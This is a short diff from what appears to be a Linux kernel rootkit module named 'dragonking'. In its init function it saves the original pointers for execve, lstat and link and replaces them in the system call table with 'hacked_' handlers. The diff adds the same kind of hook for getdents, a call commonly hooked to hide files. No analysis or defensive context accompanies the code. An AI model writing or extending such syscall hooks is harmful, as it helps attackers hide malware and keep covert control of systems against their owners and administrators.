@@ -38,6 +38,8 @@ static int __init dragonking_init(void)
 	orig_execve = (void *)sys_call_table[__NR_execve];
 	//Replace original pointer with ours
 	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
+	orig_getdents = (void *)sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (unsigned long *)&hacked_getdents;
 	orig_lstat = (void *)sys_call_table[__NR_lstat];
 	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
 	orig_link = (void *)sys_call_table[__NR_link];
